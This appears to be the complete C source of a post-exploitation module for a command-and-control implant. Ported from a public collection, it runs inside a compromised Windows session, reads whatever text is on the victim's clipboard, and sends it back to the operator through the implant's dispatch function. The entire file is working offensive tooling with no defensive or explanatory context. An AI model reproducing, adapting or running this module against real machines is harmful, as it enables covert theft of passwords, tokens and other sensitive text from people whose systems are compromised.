#include <windows.h>
#include <winuser.h>

/* =========================================================================
 * ported by Xpatr0nX
 * original source: https://github.com/rvrsh3ll/BOF_Collection/tree/master/Collection/Clipboard
 * ========================================================================= */

DECLSPEC_IMPORT void BadgerDispatch(WCHAR **dispatch, const char *fmt, ...);

#define BeaconPrintf(type, fmt, ...) BadgerDispatch(dispatch, fmt, ##__VA_ARGS__)
#define CALLBACK_OUTPUT 0x0
#define CALLBACK_ERROR  0x0d

DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$OpenClipboard(HWND);
DECLSPEC_IMPORT WINUSERAPI HANDLE WINAPI USER32$GetClipboardData(UINT);
DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$CloseClipboard(void);
DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$IsClipboardFormatAvailable(UINT);
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$GlobalLock(HGLOBAL);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$GlobalUnlock(HGLOBAL);

static size_t custom_strlen(const char* str) {
    size_t len = 0;
    while (str[len] != '\0') len++;
    return len;
}

void coffee(char **argv, int argc, WCHAR **dispatch) {
    HANDLE hClipData = NULL;
    char* pClipText = NULL;
    
    if (!USER32$IsClipboardFormatAvailable(CF_TEXT)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] No text data available in clipboard\n");
        return;
    }
    
    if (!USER32$OpenClipboard(NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open clipboard\n");
        return;
    }
    
    hClipData = USER32$GetClipboardData(CF_TEXT);
    if (hClipData == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to retrieve clipboard data\n");
        USER32$CloseClipboard();
        return;
    }
    
    pClipText = (char*)KERNEL32$GlobalLock(hClipData);
    if (pClipText == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to lock clipboard data %p\n", hClipData);
        USER32$CloseClipboard();
        return;
    }
    
    if (custom_strlen(pClipText) == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Clipboard is empty\n");
        KERNEL32$GlobalUnlock(hClipData);
        USER32$CloseClipboard();
        return; 
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Clipboard contents:\n%s\n", pClipText);
        KERNEL32$GlobalUnlock(hClipData);
        USER32$CloseClipboard();
        return;
    }
}
